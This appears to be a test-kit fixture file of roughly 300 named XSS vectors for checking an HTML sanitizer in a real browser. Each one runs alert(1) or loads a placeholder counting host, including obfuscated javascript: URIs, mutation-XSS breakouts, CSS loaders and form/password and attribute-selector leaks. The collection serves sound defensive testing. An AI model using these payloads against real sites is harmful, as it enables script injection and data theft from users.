@@ -1,0 +1,1080 @@
+# Hostile HTML vectors for Courier's sanitizer and for a real-browser check of what it lets through.
+# Written fresh for this test kit from the categories of the OWASP XSS Filter Evasion Cheat Sheet and
+# html5sec; nothing here is copied from those pages.
+#
+# Format:
+# - Lines starting with '#' before the first vector are comments, and so are blank lines there.
+# - A vector starts with a line "== <name>". Its HTML is every following line up to the next line that
+#   starts with "== " (or the end of the file), joined with "\n", with trailing blank lines removed.
+#   Inside a vector, a line starting with '#' is part of the HTML, not a comment: comments live only here.
+# - Names are lowercase [a-z0-9-]+ and unique.
+# - Placeholders, filled by HostileHtml.vectors(hitBase):
+#     {{HIT}}     the counting host for this vector: hitBase + "/" + name, for example
+#                 http://127.0.0.1:PORT/hit/<name>
+#     {{HIT//}}   the same without the scheme, for protocol-relative vectors: //127.0.0.1:PORT/hit/<name>
+#     {{U+hhhh}}  one code point, 4 to 6 hex digits, for NUL, CR, tab, form feed, zero-width characters
+#                 and the like, so the file itself holds no control bytes.
+# - Every vector holds the literal text "alert(" (it calls alert(1) when it runs) or "{{HIT" (it fetches
+#   that URL when it loads), so a browser check can count both. Some need a click or a focus; a few are
+#   legacy shapes that only old engines ran, kept because a sanitizer must still remove them.
+# - Hosts: only the placeholders, plus attacker.example where a second host is needed.
+
+== script-plain
+<script>alert(1)</script>
+
+== script-upper
+<SCRIPT>alert(1)</SCRIPT>
+
+== script-mixed-case
+<ScRiPt>alert(1)</sCrIpT>
+
+== script-slash-attr
+<script/x>alert(1)</script>
+
+== script-self-closing
+<script/>alert(1)</script>
+
+== script-newline-in-tag
+<script
+>alert(1)</script
+>
+
+== script-space-before-close
+<script >alert(1)</script >
+
+== script-tab-in-tag
+<script{{U+0009}}>alert(1)</script>
+
+== script-formfeed-in-tag
+<script{{U+000C}}type="text/javascript">alert(1)</script>
+
+== script-space-after-lt
+< script>alert(1)</script>
+
+== script-nul-in-name
+<scr{{U+0000}}ipt>alert(1)</script>
+
+== script-src-hit
+<script src="{{HIT}}"></script>
+
+== script-src-upper-unquoted
+<SCRIPT SRC={{HIT}}></SCRIPT>
+
+== script-src-protocol-relative
+<script src="{{HIT//}}"></script>
+
+== script-src-half-open
+<script src={{HIT}}?< b >
+
+== script-src-backtick
+<script src=`{{HIT}}`></script>
+
+== script-src-attr-gt
+<script a=">" src="{{HIT}}"></script>
+
+== script-no-close
+<script>alert(1)
+
+== script-nested-split
+<scr<script>ipt>alert(1)</scr</script>ipt>
+
+== script-double-lt
+<<script>alert(1);//<</script>
+
+== script-type-module
+<script type="module">alert(1)</script>
+
+== script-type-odd-case
+<script type="TeXt/JaVaScRiPt">alert(1)</script>
+
+== script-language-attr
+<script language="javascript">alert(1)</script>
+
+== script-unicode-escape
+<script>alert(1)/* alert(1) */</script>
+
+== script-fromcharcode
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))/* alert(1) */</script>
+
+== script-html-comment-body
+<script><!--
+alert(1)//--></script>
+
+== script-cdata-body
+<script>//<![CDATA[
+alert(1)//]]></script>
+
+== script-settimeout-string
+<script>setTimeout('alert(1)')</script>
+
+== script-src-data
+<script src="data:text/javascript,alert(1)"></script>
+
+== script-src-data-base64
+<script src="data:text/javascript;base64,YWxlcnQoMSk="></script><!-- the base64 is alert(1) -->
+
+== script-for-event
+<script for="window" event="onload">alert(1)</script>
+
+== script-onerror
+<script src="x" onerror="alert(1)"></script>
+
+== img-onerror
+<img src=x onerror=alert(1)>
+
+== img-onerror-quoted
+<img src="x" onerror="alert(1)">
+
+== img-onerror-upper
+<IMG SRC=x ONERROR=alert(1)>
+
+== img-onerror-slashes
+<img/src="x"/onerror="alert(1)">
+
+== img-onerror-newlines
+<img
+src=x
+onerror=alert(1)
+>
+
+== img-onerror-no-space
+<img src="x"onerror="alert(1)">
+
+== img-onerror-formfeed
+<img src=x{{U+000C}}onerror=alert(1)>
+
+== img-onerror-nul-in-name
+<img src=x on{{U+0000}}error=alert(1)>
+
+== img-onerror-label-entity
+<img src=x onerror="javascript&#58;alert(1)">
+
+== img-onerror-fetch
+<img src=x onerror="new Image().src='{{HIT}}'">
+
+== img-onerror-unclosed
+<img src=x onerror=alert(1)//
+
+== image-alias-onerror
+<image src=x onerror=alert(1)>
+
+== img-onload-data
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload=alert(1)>
+
+== body-onload
+<body onload=alert(1)>
+
+== body-onpageshow
+<body onpageshow=alert(1)>
+
+== body-onfocus
+<body onfocus=alert(1)>
+
+== body-onhashchange
+<body onhashchange=alert(1)><a href="#x">x</a>
+
+== body-onbeforeprint
+<body onbeforeprint=alert(1)>
+
+== body-onscroll
+<body onscroll=alert(1)><div style="height:4000px"></div><input autofocus>
+
+== body-vtab-onload
+<body{{U+000B}}onload=alert(1)>
+
+== frameset-onload
+<frameset onload=alert(1)>
+
+== svg-onload
+<svg onload=alert(1)>
+
+== svg-onload-slash
+<svg/onload=alert(1)>
+
+== svg-rect-onclick
+<svg><rect onclick=alert(1) width=100 height=100 /></svg>
+
+== input-autofocus-onfocus
+<input autofocus onfocus=alert(1)>
+
+== input-onblur
+<input onblur=alert(1) autofocus><input autofocus>
+
+== input-hidden-accesskey
+<input type=hidden accesskey=x onclick=alert(1)>
+
+== input-image-onerror
+<input type=image src=x onerror=alert(1)>
+
+== input-oninvalid
+<form><input required oninvalid=alert(1)><button>go</button></form>
+
+== details-ontoggle
+<details open ontoggle=alert(1)>
+
+== dialog-onclose
+<dialog open onclose=alert(1)><form method=dialog><button autofocus>x</button></form></dialog>
+
+== video-onerror
+<video src=x onerror=alert(1)></video>
+
+== video-source-onerror
+<video><source onerror=alert(1)></video>
+
+== audio-onerror
+<audio src=x onerror=alert(1)></audio>
+
+== marquee-onstart
+<marquee onstart=alert(1)>x</marquee>
+
+== marquee-onfinish
+<marquee loop=1 width=0 onfinish=alert(1)>x</marquee>
+
+== select-autofocus
+<select autofocus onfocus=alert(1)></select>
+
+== textarea-autofocus
+<textarea autofocus onfocus=alert(1)></textarea>
+
+== keygen-autofocus
+<keygen autofocus onfocus=alert(1)>
+
+== button-autofocus
+<button autofocus onfocus=alert(1)>x</button>
+
+== contenteditable-autofocus
+<div contenteditable autofocus onfocus=alert(1)>x</div>
+
+== custom-tag-tabindex-focus
+<xss autofocus tabindex=1 onfocus=alert(1)></xss>
+
+== custom-tag-onclick
+<x onclick=alert(1)>click</x>
+
+== iframe-onload
+<iframe onload=alert(1)></iframe>
+
+== object-onerror
+<object data=x onerror=alert(1)></object>
+
+== embed-onload
+<embed src=x onload=alert(1)>
+
+== style-onload
+<style onload=alert(1)></style>
+
+== link-onload
+<link rel=stylesheet href="{{HIT}}" onload=alert(1)>
+
+== link-onerror
+<link rel=stylesheet href=x onerror=alert(1)>
+
+== a-onmouseover
+<a onmouseover=alert(1)>hover</a>
+
+== div-onpointerenter
+<div onpointerenter=alert(1) style="position:fixed;top:0;left:0;width:100%;height:100%">x</div>
+
+== div-onanimationstart
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)></div>
+
+== form-oninput
+<form oninput=alert(1)><input autofocus value=x></form>
+
+== span-onclick
+<span onclick=alert(1)>click</span>
+
+== p-oncopy
+<p oncopy=alert(1)>copy me</p>
+
+== table-onmouseover
+<table onmouseover=alert(1) style="width:100%;height:100%"><tr><td>x</td></tr></table>
+
+== html-onmouseover
+<html onmouseover=alert(1)>
+
+== a-href-js
+<a href="javascript:alert(1)">x</a>
+
+== a-href-js-upper
+<a href="JAVASCRIPT:alert(1)">x</a>
+
+== a-href-js-mixed-case
+<a href="JaVaScRiPt:alert(1)">x</a>
+
+== a-href-js-unquoted
+<a href=javascript:alert(1)>x</a>
+
+== a-href-js-single-quoted
+<a href='javascript:alert(1)'>x</a>
+
+== a-href-js-decimal
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>
+
+== a-href-js-decimal-padded
+<a href="&#0000106;&#0000097;&#0000118;&#0000097;&#0000115;&#0000099;&#0000114;&#0000105;&#0000112;&#0000116;&#0000058;alert(1)">x</a>
+
+== a-href-js-decimal-no-semicolon
+<a href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58alert(1)">x</a>
+
+== a-href-js-hex
+<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">x</a>
+
+== a-href-js-hex-padded-no-semicolon
+<a href="&#x0006A&#x00061&#x00076&#x00061&#x00073&#x00063&#x00072&#x00069&#x00070&#x00074&#x0003A;alert(1)">x</a>
+
+== a-href-js-mixed-entities
+<a href="jav&#x61;scr&#105;pt&#x3a;alert(1)">x</a>
+
+== a-href-js-named-colon
+<a href="javascript&colon;alert(1)">x</a>
+
+== a-href-js-named-tab
+<a href="java&Tab;script&colon;alert(1)">x</a>
+
+== a-href-js-named-newline
+<a href="java&NewLine;script&colon;alert(1)">x</a>
+
+== a-href-js-tab
+<a href="jav{{U+0009}}ascript:alert(1)">x</a>
+
+== a-href-js-tab-entity
+<a href="jav&#x09;ascript:alert(1)">x</a>
+
+== a-href-js-newline
+<a href="jav{{U+000A}}ascript:alert(1)">x</a>
+
+== a-href-js-newline-entity
+<a href="jav&#x0A;ascript:alert(1)">x</a>
+
+== a-href-js-cr
+<a href="jav{{U+000D}}ascript:alert(1)">x</a>
+
+== a-href-js-cr-entity
+<a href="jav&#x0D;ascript:alert(1)">x</a>
+
+== a-href-js-nul
+<a href="java{{U+0000}}script:alert(1)">x</a>
+
+== a-href-js-nul-entity
+<a href="java&#0;script:alert(1)">x</a>
+
+== a-href-js-leading-space
+<a href=" javascript:alert(1)">x</a>
+
+== a-href-js-leading-controls
+<a href="{{U+0001}}{{U+0014}} javascript:alert(1)">x</a>
+
+== a-href-js-leading-entity-control
+<a href="&#14;  javascript:alert(1)">x</a>
+
+== a-href-js-zero-width
+<a href="java{{U+200B}}script:alert(1)">x</a>
+
+== a-href-js-fullwidth-colon
+<a href="javascript{{U+FF1A}}alert(1)">x</a>
+
+== a-href-js-percent-body
+<a href="javascript:%61lert(1);alert(1)">x</a>
+
+== a-href-js-comment-newline
+<a href="javascript://%0Aalert(1)">x</a>
+
+== a-href-js-target-blank
+<a href="javascript:alert(1)" target="_blank" rel="noopener">x</a>
+
+== a-href-vbscript
+<a href="vbscript:alert(1)">x</a>
+
+== a-href-vbscript-upper
+<a href="VBSCRIPT:alert(1)">x</a>
+
+== a-href-livescript
+<a href="livescript:alert(1)">x</a>
+
+== a-href-mocha
+<a href="mocha:alert(1)">x</a>
+
+== a-href-data-html
+<a href="data:text/html,<script>alert(1)</script>">x</a>
+
+== a-href-data-html-base64
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a><!-- the base64 is <script>alert(1)</script> -->
+
+== a-href-data-upper
+<a href="DATA:TEXT/HTML,<script>alert(1)</script>">x</a>
+
+== a-href-data-entity
+<a href="&#100;ata:text/html,<script>alert(1)</script>">x</a>
+
+== a-href-data-utf7
+<a href="data:text/html;charset=utf-7,+ADw-script+AD4-alert(1)+ADw-/script+AD4-">x</a>
+
+== a-href-data-svg
+<a href="data:image/svg+xml,<svg onload='alert(1)'></svg>">x</a>
+
+== a-href-data-svg-base64
+<a href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">x</a><!-- the base64 is <svg onload=alert(1)> -->
+
+== a-href-hit
+<a href="{{HIT}}">click</a>
+
+== a-href-protocol-relative
+<a href="{{HIT//}}">click</a>
+
+== area-href-js
+<map name=m><area shape=rect coords=0,0,500,500 href="javascript:alert(1)"></map><img usemap="#m" src=x width=500 height=500>
+
+== iframe-src-js
+<iframe src="javascript:alert(1)"></iframe>
+
+== iframe-src-js-entity
+<iframe src="&#106;avascript:alert(1)"></iframe>
+
+== iframe-src-js-string
+<iframe src="javascript:'<script>alert(1)</script>'"></iframe>
+
+== iframe-src-data
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+
+== iframe-src-data-base64
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe><!-- the base64 is <script>alert(1)</script> -->
+
+== embed-src-js
+<embed src="javascript:alert(1)">
+
+== object-data-js
+<object data="javascript:alert(1)"></object>
+
+== object-data-data
+<object data="data:text/html,<script>alert(1)</script>"></object>
+
+== object-data-svg
+<object data="data:image/svg+xml,<svg onload='alert(1)'></svg>" type="image/svg+xml"></object>
+
+== img-src-js
+<img src="javascript:alert(1)">
+
+== img-src-vbscript
+<img src='vbscript:alert(1)'>
+
+== img-src-ie-eval
+<img src=x:alert(alt) onerror=eval(src) alt=1>
+
+== img-src-js-entity-legacy
+<img src="&{alert(1)};">
+
+== blockquote-cite-js
+<blockquote cite="javascript:alert(1)">x</blockquote>
+
+== command-icon-js
+<command icon="javascript:alert(1)" label="x">
+
+== svg-script
+<svg><script>alert(1)</script></svg>
+
+== svg-script-entity
+<svg><script>&#97;lert(1);alert(1)</script></svg>
+
+== svg-script-cdata
+<svg><script><![CDATA[alert(1)]]></script></svg>
+
+== svg-script-href
+<svg><script href="{{HIT}}"></script></svg>
+
+== svg-script-xlink-href
+<svg><script xlink:href="{{HIT}}"></script></svg>
+
+== svg-animate-href
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>click</text></a></svg>
+
+== svg-animate-to-href
+<svg><a><animate attributeName=href to=javascript:alert(1) /><text x=20 y=20>click</text></a></svg>
+
+== svg-set-href
+<svg><a><set attributeName=href to=javascript:alert(1) /><text x=20 y=20>click</text></a></svg>
+
+== svg-animate-xlink-href
+<svg><a xlink:href="#"><animate attributeName="xlink:href" values="javascript:alert(1)" /><rect width=100 height=100 /></a></svg>
+
+== svg-animate-onbegin
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+
+== svg-set-onbegin
+<svg><set onbegin=alert(1) attributeName=x to=1></svg>
+
+== svg-discard-onbegin
+<svg><discard onbegin=alert(1)></svg>
+
+== svg-g-onload
+<svg><g onload=alert(1)></g></svg>
+
+== svg-foreignobject-script
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+
+== svg-foreignobject-iframe
+<svg><foreignObject width=100 height=100><iframe src="{{HIT}}"></iframe></foreignObject></svg>
+
+== svg-a-xlink-href-js
+<svg><a xlink:href="javascript:alert(1)"><rect width=100 height=100 /></a></svg>
+
+== svg-a-href-js
+<svg><a href="javascript:alert(1)"><text x=10 y=20>x</text></a></svg>
+
+== svg-use-href-hit
+<svg><use href="{{HIT}}#x" /></svg>
+
+== svg-use-xlink-hit
+<svg><use xlink:href="{{HIT}}#x" /></svg>
+
+== svg-use-data
+<svg><use href="data:image/svg+xml,<svg id='x'><image href='1' onerror='alert(1)'/></svg>#x" /></svg>
+
+== svg-image-href-hit
+<svg><image href="{{HIT}}" width=1 height=1 /></svg>
+
+== svg-image-xlink-hit
+<svg><image xlink:href="{{HIT}}" /></svg>
+
+== svg-image-onerror
+<svg><image href=x onerror=alert(1) /></svg>
+
+== svg-feimage-hit
+<svg><filter id=f><feImage href="{{HIT}}"/></filter><rect filter="url(#f)" width=10 height=10 /></svg>
+
+== svg-mpath-hit
+<svg><path id=p d="M0 0"/><animateMotion dur=1s><mpath href="{{HIT}}#p"/></animateMotion></svg>
+
+== svg-tref-hit
+<svg><text><tref xlink:href="{{HIT}}#t"/></text></svg>
+
+== svg-cursor-hit
+<svg><cursor xlink:href="{{HIT}}"/></svg>
+
+== svg-style-import
+<svg><style>@import url({{HIT}});</style></svg>
+
+== svg-pattern-image-hit
+<svg><pattern id=p width=10 height=10><image href="{{HIT}}" width=10 height=10 /></pattern><rect fill="url(#p)" width=10 height=10 /></svg>
+
+== math-href-js
+<math href="javascript:alert(1)">click</math>
+
+== math-mtext-href-js
+<math><mtext href="javascript:alert(1)">click</mtext></math>
+
+== math-a-xlink-href
+<math><a xlink:href="javascript:alert(1)">click</a></math>
+
+== math-maction
+<math><maction actiontype="statusline#{{HIT}}" xlink:href="javascript:alert(1)"><mtext>click</mtext><mtext>x</mtext></maction></math>
+
+== math-mi-xlink-data
+<math><mi xlink:href="data:x,<script>alert(1)</script>">click</mi></math>
+
+== math-mglyph-style
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>
+
+== math-malignmark-style
+<math><mtext><table><malignmark><style><img src=x onerror=alert(1)></style></malignmark></table></mtext></math>
+
+== math-annotation-xml
+<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>
+
+== math-mtext-h1-style
+<math><mtext><h1><a><style><img src=x onerror=alert(1)></style></a></h1></mtext></math>
+
+== mxss-noscript-title
+<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
+
+== mxss-noscript-style
+<noscript><style></noscript><img src=x onerror=alert(1)>
+
+== mxss-noembed
+<noembed><img title="</noembed><img src=x onerror=alert(1)>"></noembed>
+
+== mxss-noframes
+<noframes><img title="</noframes><img src=x onerror=alert(1)>"></noframes>
+
+== mxss-xmp
+<xmp><img title="</xmp><img src=x onerror=alert(1)>"></xmp>
+
+== mxss-iframe-text
+<iframe><img title="</iframe><img src=x onerror=alert(1)>"></iframe>
+
+== mxss-title-breakout
+<title><img title="</title><img src=x onerror=alert(1)>"></title>
+
+== mxss-textarea-breakout
+<textarea><img title="</textarea><img src=x onerror=alert(1)>"></textarea>
+
+== mxss-style-breakout
+<style><img title="</style><img src=x onerror=alert(1)>"></style>
+
+== mxss-script-breakout
+<script>"</script><img src=x onerror=alert(1)>"</script>
+
+== mxss-plaintext
+<plaintext><img src=x onerror=alert(1)>
+
+== mxss-iframe-srcdoc
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+
+== mxss-iframe-srcdoc-entities
+<iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;"></iframe>
+
+== mxss-iframe-srcdoc-double-encoded
+<iframe srcdoc="&amp;lt;img src=x onerror=alert(1)&amp;gt;"></iframe>
+
+== mxss-template-img
+<template><img src=x onerror=alert(1)></template>
+
+== mxss-template-script
+<template><script>alert(1)</script></template>
+
+== mxss-svg-p-style
+<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
+
+== mxss-svg-br-style
+<svg></br><style><a title="</style><img src=x onerror=alert(1)>"></style></svg>
+
+== mxss-svg-style-children
+<svg><style><img src=x onerror=alert(1)></style></svg>
+
+== mxss-math-style
+<math><style><img src=x onerror=alert(1)></style></math>
+
+== mxss-svg-title-style
+<svg><title><style><img src=x onerror=alert(1)></style></title></svg>
+
+== mxss-svg-cdata
+<svg><![CDATA[><image xlink:href="]]><img src=x onerror=alert(1)//"></svg>
+
+== mxss-cdata-in-html
+<![CDATA[><img src=x onerror=alert(1)>]]>
+
+== mxss-comment-bang-close
+<!-- --!><img src=x onerror=alert(1)> -->
+
+== mxss-comment-empty
+<!--><img src=x onerror=alert(1)>-->
+
+== mxss-comment-dash
+<!---><img src=x onerror=alert(1)>-->
+
+== mxss-comment-in-attribute
+<!--<img src="--><img src=x onerror=alert(1)//">
+
+== mxss-form-math
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+
+== mxss-select-template
+<select><template><style><img src=x onerror=alert(1)></style></template></select>
+
+== mxss-table-foster
+<table><img src=x onerror=alert(1)></table>
+
+== mxss-ie-backtick
+<img src="x" alt="``onerror=alert(1)">
+
+== mxss-entity-text
+&lt;img src=x onerror=alert(1)&gt;
+
+== mxss-entity-in-title
+<a title="&quot;&gt;&lt;img src=x onerror=alert(1)&gt;">x</a>
+
+== css-expression
+<div style="width:expression(alert(1))">x</div>
+
+== css-expression-comment
+<div style="width:exp/**/ression(alert(1))">x</div>
+
+== css-expression-escaped
+<div style="width:\65 xpression(alert(1))">x</div>
+
+== css-expression-fullwidth
+<div style="width:ｅｘｐｒｅｓｓｉｏｎ(alert(1))">x</div>
+
+== css-expression-style-tag
+<style>p{width:expression(alert(1))}</style><p>x</p>
+
+== css-xss-tag-expression
+<xss style="xss:expression(alert(1))">
+
+== css-img-style-expression
+<img style="xss:expr/*x*/ession(alert(1))">
+
+== css-url-hit
+<div style="background:url({{HIT}})">x</div>
+
+== css-url-quoted-hit
+<div style="background-image:url('{{HIT}}')">x</div>
+
+== css-url-escaped-name
+<div style="background:u\72l({{HIT}})">x</div>
+
+== css-url-comment-before
+<div style="background:/**/url({{HIT}})">x</div>
+
+== css-url-protocol-relative
+<div style="background:url({{HIT//}})">x</div>
+
+== css-url-js
+<div style="background:url(javascript:alert(1))">x</div>
+
+== css-url-escaped-js
+<div style="background-image:url(\6a avascript:alert(1))">x</div>
+
+== css-url-hex-escaped-all
+<div style="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028\0031\0029'\0029">x</div><!-- the escapes spell url('javascript:alert(1)') -->
+
+== css-url-data-svg
+<div style="background:url('data:image/svg+xml,<svg onload=alert(1)>')">x</div>
+
+== css-import-hit
+<style>@import url({{HIT}});</style>
+
+== css-import-string-hit
+<style>@import "{{HIT}}";</style>
+
+== css-import-escaped
+<style>@im\port '{{HIT}}';</style>
+
+== css-import-hex-escaped
+<style>@\69mport url({{HIT}});</style>
+
+== css-behavior
+<div style="behavior:url({{HIT}})">x</div>
+
+== css-moz-binding
+<div style="-moz-binding:url({{HIT}}#xss)">x</div>
+
+== css-image-set
+<div style="background-image:image-set('{{HIT}}' 1x)">x</div>
+
+== css-webkit-image-set
+<div style="background-image:-webkit-image-set(url({{HIT}}) 1x)">x</div>
+
+== css-background-shorthand
+<table style="background:#fff url({{HIT}}) no-repeat"><tr><td>x</td></tr></table>
+
+== css-list-style-image
+<ul style="list-style-image:url({{HIT}})"><li>x</li></ul>
+
+== css-cursor
+<div style="cursor:url({{HIT}}),auto">x</div>
+
+== css-border-image
+<div style="border:10px solid;border-image:url({{HIT}}) 30 round">x</div>
+
+== css-font-face
+<style>@font-face{font-family:x;src:url({{HIT}})}body{font-family:x}</style>
+
+== css-content-url
+<style>p::before{content:url({{HIT}})}</style><p>x</p>
+
+== css-filter-url
+<div style="filter:url({{HIT}}#f)">x</div>
+
+== css-mask-url
+<div style="mask:url({{HIT}}#m);-webkit-mask-image:url({{HIT}})">x</div>
+
+== css-shape-outside
+<div style="shape-outside:url({{HIT}});float:left;width:10px;height:10px">x</div>
+
+== css-style-tag-background
+<style>body{background:url({{HIT}})}</style>
+
+== css-attribute-selector-leak
+<style>input[value^=a]{background:url({{HIT}})}</style><input value=abc>
+
+== css-style-type-javascript
+<style type="text/javascript">alert(1)</style>
+
+== meta-refresh-hit
+<meta http-equiv="refresh" content="0;url={{HIT}}">
+
+== meta-refresh-upper
+<META HTTP-EQUIV="REFRESH" CONTENT="0; URL={{HIT}}">
+
+== meta-refresh-no-url-key
+<meta http-equiv="refresh" content="0;{{HIT}}">
+
+== meta-refresh-double-url
+<meta http-equiv="refresh" content="0; URL=http://;URL={{HIT}}">
+
+== meta-refresh-js
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+== meta-refresh-data
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
+
+== meta-refresh-data-base64
+<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><!-- the base64 is <script>alert(1)</script> -->
+
+== meta-charset-utf7
+<meta charset="utf-7">+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+== base-href-img
+<base href="{{HIT}}/"><img src="pixel.gif">
+
+== base-href-script
+<base href="{{HIT}}/"><script src="x.js"></script>
+
+== base-href-protocol-relative
+<base href="{{HIT//}}/"><img src="p.gif">
+
+== base-href-js
+<base href="javascript:alert(1)//"><a href="/x">x</a>
+
+== link-stylesheet
+<link rel=stylesheet href="{{HIT}}">
+
+== link-stylesheet-upper
+<LINK REL="STYLESHEET" HREF="{{HIT}}">
+
+== link-stylesheet-js
+<link rel=stylesheet href="javascript:alert(1)">
+
+== link-import
+<link rel=import href="{{HIT}}">
+
+== link-prefetch
+<link rel=prefetch href="{{HIT}}">
+
+== link-preload
+<link rel=preload href="{{HIT}}" as=image>
+
+== link-dns-prefetch
+<link rel=dns-prefetch href="{{HIT//}}">
+
+== link-preconnect
+<link rel=preconnect href="{{HIT}}">
+
+== link-modulepreload
+<link rel=modulepreload href="{{HIT}}">
+
+== link-prerender
+<link rel=prerender href="{{HIT}}">
+
+== link-icon
+<link rel=icon href="{{HIT}}">
+
+== link-manifest
+<link rel=manifest href="{{HIT}}">
+
+== html-manifest
+<html manifest="{{HIT}}"><body>x</body></html>
+
+== form-action-js
+<form action="javascript:alert(1)"><input type=submit value=go></form>
+
+== form-action-hit
+<form action="{{HIT}}" method=post><input name=q value=x><input type=submit></form>
+
+== form-password-autofill
+<form action="{{HIT}}"><input name=u autocomplete=username><input type=password name=p autocomplete=current-password><input type=submit></form>
+
+== form-autofocus-submit
+<form action="javascript:alert(1)"><input autofocus onfocus="this.form.submit()"></form>
+
+== button-formaction-js
+<form><button formaction="javascript:alert(1)">go</button></form>
+
+== button-formaction-hit
+<form><button formaction="{{HIT}}">go</button></form>
+
+== button-form-outside
+<button form=f formaction="javascript:alert(1)">go</button><form id=f></form>
+
+== input-submit-formaction-js
+<form><input type=submit formaction="javascript:alert(1)" value=go></form>
+
+== input-image-formaction-js
+<form><input type=image src=x formaction="javascript:alert(1)"></form>
+
+== isindex-action
+<isindex action="javascript:alert(1)" type=image>
+
+== isindex-formaction
+<isindex formaction="javascript:alert(1)" type=submit>
+
+== object-data-hit
+<object data="{{HIT}}"></object>
+
+== object-codebase-hit
+<object codebase="{{HIT}}" classid="clsid:00000000-0000-0000-0000-000000000000"></object>
+
+== object-param-movie
+<object><param name=movie value="{{HIT}}"></object>
+
+== object-param-src-js
+<object><param name=src value="javascript:alert(1)"></object>
+
+== object-flash-allowscript
+<object data="{{HIT}}" type="application/x-shockwave-flash"><param name=allowScriptAccess value=always></object>
+
+== object-scriptlet
+<object type="text/x-scriptlet" data="{{HIT}}"></object>
+
+== object-classid-url-js
+<object classid="clsid:ae24fdae-03c6-11d1-8b76-0080c744f389"><param name=url value="javascript:alert(1)"></object>
+
+== embed-src-hit
+<embed src="{{HIT}}">
+
+== embed-src-data-svg
+<embed src="data:image/svg+xml,<svg onload='alert(1)'></svg>" type="image/svg+xml">
+
+== embed-code
+<embed code="{{HIT}}" allowscriptaccess=always>
+
+== applet-codebase
+<applet code="x.class" codebase="{{HIT}}"></applet>
+
+== applet-archive
+<applet archive="{{HIT}}" code="x"></applet>
+
+== img-src-hit
+<img src="{{HIT}}">
+
+== img-src-hit-unquoted
+<img src={{HIT}}>
+
+== img-src-protocol-relative
+<img src="{{HIT//}}">
+
+== img-src-hit-query
+<img src="{{HIT}}?a=1&amp;b=2">
+
+== img-src-hit-newline
+<img src="{{HIT}}{{U+000A}}">
+
+== img-src-hit-pixel
+<img src="{{HIT}}" width=1 height=1 style="display:none" alt="">
+
+== img-src-hit-zero-size
+<img src="{{HIT}}" width=0 height=0>
+
+== img-src-half-open
+<img src="{{HIT}}"
+
+== img-srcset-hit
+<img srcset="{{HIT}} 1x">
+
+== img-srcset-wide
+<img srcset="data:, 100w, {{HIT}} 2000w" sizes="2000px">
+
+== img-srcset-protocol-relative
+<img srcset="{{HIT//}} 1x">
+
+== img-lowsrc-hit
+<img lowsrc="{{HIT}}">
+
+== img-dynsrc-hit
+<img dynsrc="{{HIT}}">
+
+== img-lowsrc-js
+<img lowsrc="javascript:alert(1)">
+
+== img-dynsrc-js
+<img dynsrc="javascript:alert(1)">
+
+== img-longdesc-js
+<img src=x longdesc="javascript:alert(1)">
+
+== picture-source-srcset
+<picture><source srcset="{{HIT}}"><img src="data:,"></picture>
+
+== video-poster-hit
+<video poster="{{HIT}}"></video>
+
+== video-poster-js
+<video poster="javascript:alert(1)"></video>
+
+== video-src-hit
+<video src="{{HIT}}" autoplay muted></video>
+
+== video-track-hit
+<video src="data:,"><track default src="{{HIT}}"></video>
+
+== audio-src-hit
+<audio src="{{HIT}}" autoplay></audio>
+
+== audio-source-hit
+<audio autoplay><source src="{{HIT}}"></audio>
+
+== input-image-src-hit
+<input type=image src="{{HIT}}">
+
+== table-background-hit
+<table background="{{HIT}}"><tr><td>x</td></tr></table>
+
+== td-background-hit
+<table><tr><td background="{{HIT}}">x</td></tr></table>
+
+== th-background-hit
+<table><tr><th background="{{HIT}}">x</th></tr></table>
+
+== table-background-js
+<table background="javascript:alert(1)"><tr><td>x</td></tr></table>
+
+== body-background-hit
+<body background="{{HIT}}">
+
+== body-background-js
+<body background="javascript:alert(1)">
+
+== frameset-frame-hit
+<frameset><frame src="{{HIT}}"></frameset>
+
+== frameset-frame-js
+<frameset><frame src="javascript:alert(1)"></frameset>
+
+== iframe-src-hit
+<iframe src="{{HIT}}"></iframe>
+
+== iframe-src-hidden-hit
+<iframe src="{{HIT}}" width=0 height=0 style="display:none"></iframe>
+
+== iframe-src-protocol-relative
+<iframe src="{{HIT//}}"></iframe>
+
+== iframe-srcdoc-hit
+<iframe srcdoc="<img src='{{HIT}}'>"></iframe>
+
+== a-ping-hit
+<a href="#x" ping="{{HIT}}">click</a>
+
+== area-ping-hit
+<map name=m><area shape=rect coords=0,0,99,99 href="#x" ping="{{HIT}}"></map><img usemap="#m" src=x width=99 height=99>
+
+== bgsound-src-hit
+<bgsound src="{{HIT}}">
+
+== bgsound-src-js
+<bgsound src="javascript:alert(1)">
+
+== layer-src-hit
+<layer src="{{HIT}}"></layer>
+
